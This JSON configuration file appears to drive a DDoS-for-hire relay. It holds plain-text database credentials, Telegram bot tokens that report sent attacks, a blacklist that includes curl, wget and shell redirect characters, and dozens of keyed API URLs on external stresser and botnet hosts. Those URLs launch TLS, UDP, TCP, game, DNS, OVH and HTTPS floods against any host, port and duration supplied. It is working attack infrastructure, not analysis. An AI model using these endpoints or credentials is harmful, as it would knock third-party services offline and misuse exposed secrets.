{
    "webserver": {
        "host": "116.103.229.45",
        "debug": true,
        "enabled": true
    },
    "database": {
        "host": "localhost:3306",
        "username": "funnel11545",
        "password": "funnel115455435435",
        "table": "funnel11"
    },
    "webhooks": {
        "telegram": {
            "attack_sent": {
                "token": "6171307436:AAHLyEQ0s7rGwz_ac5th0LHwhBLfXE0DRi4",
                "title": "USER ATTACK SENT SUCCESSFULLY",
                "chat_id": "-4085480811",
                "enabled": true
            },
            "blacklisted_host": {
                "token": "6171307436:AAHLyEQ0s7rGwz_ac5th0LHwhBLfXE0DRi4",
                "title": "USER TRIED ATTACKING BLACKLIST",
                "chat_id": "-4043614615",
                "enabled": true
            }
        },
        "discord": {
            "attack_sent": {
                "webhook": "",
                "title": "USER ATTACK SENT SUCCESSFULLY",
                "image": "https://static.vecteezy.com/system/resources/previews/001/200/261/original/check-png.png",
                "hex_color": "",
                "enabled": false
            },
            "blacklisted_host": {
                "webhook": "",
                "title": "USER TRIED ATTACKING BLACKLIST",
                "image": "http://www.clipartbest.com/cliparts/RiA/ExB/RiAExBz9T.png",
                "hex_color": "",
                "enabled": false
            }
        }
    },
    "attack_settings": {
        "blacklists": [
            ".gov",
            ".edu",
            "curl",
            ".ru",
            "russia",
            "wget",
            "1.1.1.1",
            ">",
            "<",
            "echo",
            "insert",
            "mysql",
            "localhost",
            "graph",
            "hit",
            "dstat"
        ],
        "attacks": {
            "enabled": true,
            "slots": {
                "max": 3,
                "enabled": true
            },
            "powersaving": {
                "enabled": true
            },
            "spamcheck": {
                "general": {
                    "amount": 3,
                    "per_seconds": 200,
                    "enabled": false
                },
                "target": {
                    "amount": 3,
                    "per_seconds": 200,
                    "enabled": false
                }
            }
        }
    },
    "attacks": [
        {
            "name": "TLS",
            "links": [
                "http://51.81.230.244:9901/api/attack?username=andanh20233&key=andanh20233&host={HOST}&port={PORT}&time={TIME}&method=TLS",
                "http://45.140.188.169:999/api/attack?username=meow&key=meow1&host={HOST}&port={PORT}&time={TIME}&method=TLS&concurrents=1",
                "https://api.tcp-entropy.xyz/api/attack?key=SNprMvr4mIhP&target={HOST}&port={PORT}&duration={TIME}&method=!tls",
                "http://172.104.163.183:8080/api?key=andanh-jsx&host={HOST}&port={PORT}&time={TIME}&method=tlsv2",
                "http://185.225.75.43:1337/botnet/api?key=tcpsyn!&host={HOST}&port={PORT}&time={TIME}&method=tls",
                "https://seized.lol/api/attack?username=andanh&key=andaho29&host={HOST}&port={PORT}&time={TIME}&method=tls-vip",
                "http://45.93.200.142:1337/api/attack?host={HOST}&port={PORT}&time={TIME}&method=TLS&key=tcpacksyn23",
                "https://stresse.ink/api/attack?username=clienttrade&secret=clienttradekey&host={HOST}&port={POST}&time={TIME}&method=https",
                "http://45.41.241.26/api/send?username=meow&token=Demon-djivnsiuvjsdv&host={HOST}&port={PORT}&time={TIME}&method=TLS-BETA",
                "http://84.54.51.47/api/attack?username=bbbb&key=bbbb&host={HOST}&port={PORT}&time={TIME}&method=.TLS",
                "https://gorilla-spoofed-api.cloud/api/attack?username=coyo&secret=coyopenisissmall&host={HOST}&port={PORT}&time={TIME}&method=HTTPS",
                "http://84.54.51.176:1337/astra/api?username=meowapi&key=changeme&host={HOST}&port={PORT}&time={TIME}&method=TLS"
            ],
            "config": {
                "slots": {
                    "max": 2,
                    "enabled": false
                },
                "maxtime": {
                    "hard": {
                        "time": 60,
                        "enabled": false
                    },
                    "soft": {
                        "time": 30,
                        "enabled": false
                    }
                },
                "status": {
                    "enabled": true,
                    "vip": false,
                    "private": {
                        "enabled": false,
                        "users": [
                            "root",
                            "mypartner"
                        ]
                    }
                }
            }
        },
        {
            "name": "!TLS",
            "links": [
                "http://51.81.230.244:9901/api/attack?username=andanh20233&key=andanh20233&host={HOST}&port={PORT}&time={TIME}&method=TLS",
                "http://45.140.188.169:999/api/attack?username=element&key=element1&host={HOST}&port={PORT}&time={TIME}&method=TLS&concurrents=1",
                "https://api.tcp-entropy.xyz/api/attack?key=SNprMvr4mIhP&target={HOST}&port={PORT}&duration={TIME}&method=!tls",
                "http://172.104.163.183:8080/api?key=andanh-jsx&host={HOST}&port={PORT}&time={TIME}&method=tlsv2",
                "http://185.225.75.43:1337/botnet/api?key=tcpsyn!&host={HOST}&port={PORT}&time={TIME}&method=tls",
                "http://45.93.200.142:1337/api/attack?host={HOST}&port={PORT}&time={TIME}&method=TLS&key=tcpacksyn23",
                "https://stresse.ink/api/attack?username=clienttrade&secret=clienttradekey&host={HOST}&port={PORT}&time={TIME}&method=https"
            ],
            "config": {
                "slots": {
                    "max": 2,
                    "enabled": false
                },
                "maxtime": {
                    "hard": {
                        "time": 60,
                        "enabled": false
                    },
                    "soft": {
                        "time": 30,
                        "enabled": false
                    }
                },
                "status": {
                    "enabled": true,
                    "vip": false,
                    "private": {
                        "enabled": false,
                        "users": [
                            "root",
                            "mypartner"
                        ]
                    }
                }
            }
        },
        {
            "name": "BROWSER",
            "links": [
                "http://51.81.230.244:9901/api/attack?username=andanh20233&key=andanh20233&host={HOST}&port={PORT}&time={TIME}&method=BROWSER",
                "http://45.140.188.169:999/api/attack?username=meow&key=meow1&host={HOST}&port={PORT}&time={TIME}&method=BROWSERX&concurrents=1",
                "http://172.104.163.183:8080/api?key=andanh-jsx&host={HOST}&port={PORT}&time={TIME}&method=bypass",
                "http://opticstress.lol/api/attack?username=tcpsyn&secret=tcpsyn25565&host={HOST}&port={PORT}&time={TIME}&method=BROWSER",
                "https://seized.lol/api/attack?username=andanh&key=andaho29&host={HOST}&port={PORT}&time={TIME}&method=!browser-vip",
                "http://45.41.241.26/api/send?username=meow&token=Demon-djivnsiuvjsdv&host={HOST}&port={PORT}&time={TIME}&method=BROWSER",
                "https://gorilla-spoofed-api.cloud/api/attack?username=coyo&secret=coyopenisissmall&host={HOST}&port={PORT}&time={TIME}&method=HTTPSBYPASS",
                "http://84.54.51.176:1337/astra/api?username=meowapi&key=changeme&host={HOST}&port={PORT}&time={TIME}&method=HTTPRAW"
            ],
            "config": {
                "slots": {
                    "max": 2,
                    "enabled": false
                },
                "maxtime": {
                    "hard": {
                        "time": 60,
                        "enabled": false
                    },
                    "soft": {
                        "time": 30,
                        "enabled": false
                    }
                },
                "status": {
                    "enabled": true,
                    "vip": false,
                    "private": {
                        "enabled": false,
                        "users": [
                            "root",
                            "mypartner"
                        ]
                    }
                }
            }
        },
        {
            "name": "UDP",
            "links": [
                "http://51.81.230.244:9901/api/attack?username=andanh20233&key=andanh20233&host={HOST}&port={PORT}&time={TIME}&method=UDP",
                "http://45.140.188.169:999/api/attack?username=meow&key=meow1&host={HOST}&port={PORT}&time={TIME}&method=UDP-VIP&concurrents=1",
                "http://45.128.232.98:1337/yuze/api?key=andanh89&host={HOST}&port={PORT}&time={TIME}&method=UDP",
                "https://api.tcp-entropy.xyz/api/attack?key=SNprMvr4mIhP&target={HOST}&port={PORT}&duration={TIME}&method=!udp",
                "http://185.225.75.43:1337/botnet/api?key=tcpsyn!&host={HOST}&port={PORT}&time={TIME}&method=UDP",
                "http://opticstress.lol/api/attack?username=tcpsyn&secret=tcpsyn25565&host={HOST}&port={PORT}&time={TIME}&method=UDP",
                "https://seized.lol/api/attack?username=andanh&key=andaho29&host={HOST}&port={PORT}&time={TIME}&method=!udp-vip",
                "http://45.41.241.26/api/send?username=meow&token=Demon-djivnsiuvjsdv&host={HOST}&port={PORT}&time={TIME}&method=UDP",
                "http://84.54.51.47/api/attack?username=bbbb&key=bbbb&host={HOST}&port={PORT}&time={TIME}&method=.UDP",
                "https://gorilla-spoofed-api.cloud/api/attack?username=coyo&secret=coyopenisissmall&host={HOST}&port={PORT}&time={TIME}&method=UDP",
                "http://84.54.51.176:1337/astra/api?username=meowapi&key=changeme&host={HOST}&port={PORT}&time={TIME}&method=UDP-BYPASS"
            ],
            "config": {
                "slots": {
                    "max": 2,
                    "enabled": false
                },
                "maxtime": {
                    "hard": {
                        "time": 60,
                        "enabled": false
                    },
                    "soft": {
                        "time": 30,
                        "enabled": false
                    }
                },
                "status": {
                    "enabled": true,
                    "vip": false,
                    "private": {
                        "enabled": false,
                        "users": [
                            "root",
                            "mypartner"
                        ]
                    }
                }
            }
        },
        {
            "name": "GUDP",
            "links": [
                "http://51.81.230.244:9901/api/attack?username=andanh20233&key=andanh20233&host={HOST}&port={PORT}&time={TIME}&method=GUDP",
                "http://45.140.188.169:999/api/attack?username=meow&key=meow1&host={HOST}&port={PORT}&time={TIME}&method=GUDP&concurrents=1",
                "http://cia-network.lol:8080/cia/api?key=616-422-113&host={HOST}&port={PORT}&time={TIME}&method=!GUDP",
                "https://gorilla-spoofed-api.cloud/api/attack?username=coyo&secret=coyopenisissmall&host={HOST}&port={PORT}&time={TIME}&method=UDPBYPASS",
                "http://84.54.51.176:1337/astra/api?username=meowapi&key=changeme&host={HOST}&port={PORT}&time={TIME}&method=GUDP"
            ],
            "config": {
                "slots": {
                    "max": 2,
                    "enabled": false
                },
                "maxtime": {
                    "hard": {
                        "time": 60,
                        "enabled": false
                    },
                    "soft": {
                        "time": 30,
                        "enabled": false
                    }
                },
                "status": {
                    "enabled": true,
                    "vip": false,
                    "private": {
                        "enabled": false,
                        "users": [
                            "root",
                            "mypartner"
                        ]
                    }
                }
            }
        },
        {
            "name": "PUDP",
            "links": [
                "http://51.81.230.244:9901/api/attack?username=andanh20233&key=andanh20233&host={HOST}&port={PORT}&time={TIME}&method=PUDP",
                "http://45.140.188.169:999/api/attack?username=meow&key=meow1&host={HOST}&port={PORT}&time={TIME}&method=UDPKILL&concurrents=1",
                "http://cia-network.lol:8080/cia/api?key=616-422-113&host={HOST}&port={PORT}&time={TIME}&method=PUDP",
                "http://84.54.51.47/api/attack?username=bbbb&key=bbbb&host={HOST}&port={PORT}&time={TIME}&method=.PUDP"
            ],
            "config": {
                "slots": {
                    "max": 2,
                    "enabled": false
                },
                "maxtime": {
                    "hard": {
                        "time": 60,
                        "enabled": false
                    },
                    "soft": {
                        "time": 30,
                        "enabled": false
                    }
                },
                "status": {
                    "enabled": true,
                    "vip": false,
                    "private": {
                        "enabled": false,
                        "users": [
                            "root",
                            "mypartner"
                        ]
                    }
                }
            }
        },
        {
            "name": "TCP",
            "links": [
                "http://51.81.230.244:9901/api/attack?username=andanh20233&key=andanh20233&host={HOST}&port={PORT}&time={TIME}&method=TCP",
                "http://45.140.188.169:999/api/attack?username=meow&key=meow1&host={HOST}&port={PORT}&time={TIME}&method=TCP-VIP&concurrents=1",
                "http://45.128.232.98:1337/yuze/api?key=andanh89&host={HOST}&port={PORT}&time={TIME}&method=TCP",
                "https://api.tcp-entropy.xyz/api/attack?key=SNprMvr4mIhP&target={HOST}&port={PORT}&duration={TIME}&method=!tcp",
                "http://185.225.75.43:1337/botnet/api?key=tcpsyn!&host={HOST}&port={PORT}&time={TIME}&method=tcp",
                "http://cia-network.lol:8080/cia/api?key=616-422-113&host={HOST}&port={PORT}&time={TIME}&method=!TCPBYPASS",
                "http://opticstress.lol/api/attack?username=tcpsyn&secret=tcpsyn25565&host={HOST}&port={PORT}&time={TIME}&method=TCP",
                "https://seized.lol/api/attack?username=andanh&key=andaho29&host={HOST}&port={PORT}&time={TIME}&method=!tcp-vip",
                "http://84.54.51.47/api/attack?username=bbbb&key=bbbb&host={HOST}&port={PORT}&time={TIME}&method=.TCP",
                "https://gorilla-spoofed-api.cloud/api/attack?username=coyo&secret=coyopenisissmall&host={HOST}&port={PORT}&time={TIME}&method=TCPBYPASS",
                "http://84.54.51.176:1337/astra/api?username=meowapi&key=changeme&host={HOST}&port={PORT}&time={TIME}&method=TCP"
            ],
            "config": {
                "slots": {
                    "max": 2,
                    "enabled": false
                },
                "maxtime": {
                    "hard": {
                        "time": 60,
                        "enabled": false
                    },
                    "soft": {
                        "time": 30,
                        "enabled": false
                    }
                },
                "status": {
                    "enabled": true,
                    "vip": false,
                    "private": {
                        "enabled": false,
                        "users": [
                            "root",
                            "mypartner"
                        ]
                    }
                }
            }
        },
        {
            "name": "GAME",
            "links": [
                "http://51.81.230.244:9901/api/attack?username=andanh20233&key=andanh20233&host={HOST}&port={PORT}&time={TIME}&method=GAME",
                "http://45.140.188.169:999/api/attack?username=meow&key=meow1&host={HOST}&port={PORT}&time={TIME}&method=GAME&concurrents=1",
                "http://45.128.232.98:1337/i/api?key=andanh89&host={HOST}&port={PORT}&time={TIME}&method=game",
                "http://185.225.75.43:1337/botnet/api?key=tcpsyn!&host={HOST}&port={PORT}&time={TIME}&method=game",
                "http://opticstress.lol/api/attack?username=tcpsyn&secret=tcpsyn25565&host={HOST}&port={PORT}&time={TIME}&method=GAME",
                "http://cia-network.lol:8080/cia/api?key=616-422-113&host={HOST}&port={PORT}&time={TIME}&method=!KILLALL",
                "http://84.54.51.47/api/attack?username=bbbb&key=bbbb&host={HOST}&port={PORT}&time={TIME}&method=.GAME",
                "https://gorilla-spoofed-api.cloud/api/attack?username=coyo&secret=coyopenisissmall&host={HOST}&port={PORT}&time={TIME}&method=GAME",
                "http://84.54.51.176:1337/astra/api?username=meowapi&key=changeme&host={HOST}&port={PORT}&time={TIME}&method=GAME"
            ],
            "config": {
                "slots": {
                    "max": 2,
                    "enabled": false
                },
                "maxtime": {
                    "hard": {
                        "time": 60,
                        "enabled": false
                    },
                    "soft": {
                        "time": 30,
                        "enabled": false
                    }
                },
                "status": {
                    "enabled": true,
                    "vip": false,
                    "private": {
                        "enabled": false,
                        "users": [
                            "root",
                            "mypartner"
                        ]
                    }
                }
            }
        },
        {
            "name": "ACK",
            "links": [
                "http://51.81.230.244:9901/api/attack?username=andanh20233&key=andanh20233&host={HOST}&port={PORT}&time={TIME}&method=ACK",
                "http://45.140.188.169:999/api/attack?username=meow&key=meow1&host={HOST}&port={PORT}&time={TIME}&method=ACK-RAW&concurrents=1",
                "http://185.225.75.43:1337/botnet/api?key=tcpsyn!&host={HOST}&port={PORT}&time={TIME}&method=syn",
                "http://cia-network.lol:8080/cia/api?key=616-422-113&host={HOST}&port={PORT}&time={TIME}&method=!ACK",
                "http://84.54.51.47/api/attack?username=bbbb&key=bbbb&host={HOST}&port={PORT}&time={TIME}&method=.SYN",
                "https://gorilla-spoofed-api.cloud/api/attack?username=coyo&secret=coyopenisissmall&host={HOST}&port={PORT}&time={TIME}&method=HANDSHAKE",
                "http://84.54.51.176:1337/astra/api?username=meowapi&key=changeme&host={HOST}&port={PORT}&time={TIME}&method=TCPBYPASS"
            ],
            "config": {
                "slots": {
                    "max": 2,
                    "enabled": false
                },
                "maxtime": {
                    "hard": {
                        "time": 60,
                        "enabled": false
                    },
                    "soft": {
                        "time": 30,
                        "enabled": false
                    }
                },
                "status": {
                    "enabled": true,
                    "vip": false,
                    "private": {
                        "enabled": false,
                        "users": [
                            "root",
                            "mypartner"
                        ]
                    }
                }
            }
        },
        {
            "name": "DNS",
            "links": [
                "http://51.81.230.244:9901/api/attack?username=andanh20233&key=andanh20233&host={HOST}&port={PORT}&time={TIME}&method=DNS",
                "http://185.225.75.43:1337/botnet/api?key=tcpsyn!&host={HOST}&port={PORT}&time={TIME}&method=dns",
                "http://cia-network.lol:8080/cia/api?key=616-422-113&host={HOST}&port={PORT}&time={TIME}&method=!DNS",
                "http://84.54.51.47/api/attack?username=bbbb&key=bbbb&host={HOST}&port={PORT}&time={TIME}&method=.HOME"
            ],
            "config": {
                "slots": {
                    "max": 2,
                    "enabled": false
                },
                "maxtime": {
                    "hard": {
                        "time": 60,
                        "enabled": false
                    },
                    "soft": {
                        "time": 30,
                        "enabled": false
                    }
                },
                "status": {
                    "enabled": true,
                    "vip": false,
                    "private": {
                        "enabled": false,
                        "users": [
                            "root",
                            "mypartner"
                        ]
                    }
                }
            }
        },
        {
            "name": "SOCKET",
            "links": [
                "http://51.81.230.244:9901/api/attack?username=andanh20233&key=andanh20233&host={HOST}&port={PORT}&time={TIME}&method=SOCKET",
                "https://api.tcp-entropy.xyz/api/attack?key=SNprMvr4mIhP&target={HOST}&port={PORT}&duration={TIME}&method=!socket",
                "http://185.225.75.43:1337/botnet/api?key=tcpsyn!&host={HOST}&port={PORT}&time={TIME}&method=ssh",
                "http://cia-network.lol:8080/cia/api?key=616-422-113&host={HOST}&port={PORT}&time={TIME}&method=!TCPSOCKET",
                "http://84.54.51.47/api/attack?username=bbbb&key=bbbb&host={HOST}&port={PORT}&time={TIME}&method=.SOCKET",
                "https://gorilla-spoofed-api.cloud/api/attack?username=coyo&secret=coyopenisissmall&host={HOST}&port={PORT}&time={TIME}&method=SOCKET",
                "http://84.54.51.176:1337/astra/api?username=meowapi&key=changeme&host={HOST}&port={PORT}&time={TIME}&method=HANDSHAKE"
            ],
            "config": {
                "slots": {
                    "max": 2,
                    "enabled": false
                },
                "maxtime": {
                    "hard": {
                        "time": 60,
                        "enabled": false
                    },
                    "soft": {
                        "time": 30,
                        "enabled": false
                    }
                },
                "status": {
                    "enabled": true,
                    "vip": false,
                    "private": {
                        "enabled": false,
                        "users": [
                            "root",
                            "mypartner"
                        ]
                    }
                }
            }
        },
        {
            "name": "OVH",
            "links": [
                "http://51.81.230.244:9901/api/attack?username=andanh20233&key=andanh20233&host={HOST}&port={PORT}&time={TIME}&method=OVH",
                "http://45.140.188.169:999/api/attack?username=meow&key=meow1&host={HOST}&port={PORT}&time={TIME}&method=OVH-VIP&concurrents=1",
                "http://45.128.232.98:1337/yuze/api?key=andanh89&host={HOST}&port={PORT}&time={TIME}&method=OVH",
                "https://api.tcp-entropy.xyz/api/attack?key=SNprMvr4mIhP&target={HOST}&port={PORT}&duration={TIME}&method=!ovh",
                "http://185.225.75.43:1337/botnet/api?key=tcpsyn!&host={HOST}&port={PORT}&time={TIME}&method=ovh",
                "http://cia-network.lol:8080/cia/api?key=616-422-113&host={HOST}&port={PORT}&time={TIME}&method=!OVHRAW",
                "http://opticstress.lol/api/attack?username=tcpsyn&secret=tcpsyn25565&host={HOST}&port={PORT}&time={TIME}&method=OVH",
                "https://seized.lol/api/attack?username=andanh&key=andaho29&host={HOST}&port={PORT}&time={TIME}&method=!ovh-vip",
                "http://45.41.241.26/api/send?username=meow&token=Demon-djivnsiuvjsdv&host={HOST}&port={PORT}&time={TIME}&method=ovh",
                "http://84.54.51.47/api/attack?username=bbbb&key=bbbb&host={HOST}&port={PORT}&time={TIME}&method=.OVH",
                "https://gorilla-spoofed-api.cloud/api/attack?username=coyo&secret=coyopenisissmall&host={HOST}&port={PORT}&time={TIME}&method=OVHTCP"
            ],
            "config": {
                "slots": {
                    "max": 2,
                    "enabled": false
                },
                "maxtime": {
                    "hard": {
                        "time": 60,
                        "enabled": false
                    },
                    "soft": {
                        "time": 30,
                        "enabled": false
                    }
                },
                "status": {
                    "enabled": true,
                    "vip": false,
                    "private": {
                        "enabled": false,
                        "users": [
                            "root",
                            "mypartner"
                        ]
                    }
                }
            }
        },
        {
            "name": "HTTPS",
            "links": [
                "http://51.81.230.244:9901/api/attack?username=andanh20233&key=andanh20233&host={HOST}&port={PORT}&time={TIME}&method=HTTP",
                "http://45.140.188.169:999/api/attack?username=meow&key=meow1&host={HOST}&port={PORT}&time={TIME}&method=HTTPS-VIP&concurrents=1",
                "http://45.128.232.98:1337/yuze/api?key=andanh89&host={HOST}&port={PORT}&time={TIME}&method=HTTPS",
                "https://api.tcp-entropy.xyz/api/attack?key=SNprMvr4mIhP&target={HOST}&port={PORT}&duration={TIME}&method=!bypass",
                "http://172.104.163.183:8080/api?key=andanh-jsx&host={HOST}&port={PORT}&time={TIME}&method=https",
                "http://185.225.75.43:1337/botnet/api?key=tcpsyn!&host={HOST}&port={PORT}&time={TIME}&method=https",
                "http://cia-network.lol:8080/cia/api?key=616-422-113&host={HOST}&port={PORT}&time={TIME}&method=!HTTP",
                "https://seized.lol/api/attack?username=andanh&key=andaho29&host={HOST}&port={PORT}&time={TIME}&method=!https-vip",
                "http://45.41.241.26/api/send?username=meow&token=Demon-djivnsiuvjsdv&host={HOST}&port={PORT}&time={TIME}&method=https"
            ],
            "config": {
                "slots": {
                    "max": 2,
                    "enabled": false
                },
                "maxtime": {
                    "hard": {
                        "time": 60,
                        "enabled": false
                    },
                    "soft": {
                        "time": 30,
                        "enabled": false
                    }
                },
                "status": {
                    "enabled": true,
                    "vip": false,
                    "private": {
                        "enabled": false,
                        "users": [
                            "kingcobra",
                            "johnthegoat"
                        ]
                    }
                }
            }
        }
    ]
}